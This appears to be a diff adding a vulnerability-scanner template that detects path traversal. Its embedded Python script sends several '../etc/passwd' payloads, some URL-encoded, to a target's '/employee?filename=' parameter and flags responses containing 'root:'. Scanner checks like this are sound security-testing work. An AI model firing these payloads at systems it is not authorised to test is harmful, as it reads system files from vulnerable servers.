@@ -1,0 +1,45 @@
+id: path-traversal-detection
+
+info:
+  name: Path Traversal Detection
+  author: Kseniia Prokopovich
+  severity: high
+  description: Detect Path Traversal using Python Code Protocol
+  tags: path-traversal
+
+code:
+  - engine:
+      - python3
+    source: |
+      import urllib.request
+      import sys
+
+      base = sys.stdin.read().strip()
+
+      payloads = [
+          "../../etc/passwd",
+          "../../../etc/passwd",
+          "../../../../etc/passwd",
+          "..%2f..%2f..%2fetc%2fpasswd",
+          "/etc/passwd"
+      ]
+
+      for p in payloads:
+          url = f"{base}/employee?filename={p}"
+
+          try:
+              resp = urllib.request.urlopen(url)
+              body = resp.read().decode()
+
+              if resp.status == 200 and "root:" in body:
+                  print("MATCHED")
+                  print(url)
+                  break
+
+          except:
+              pass
+
+    matchers:
+      - type: word
+        words:
+          - "MATCHED"
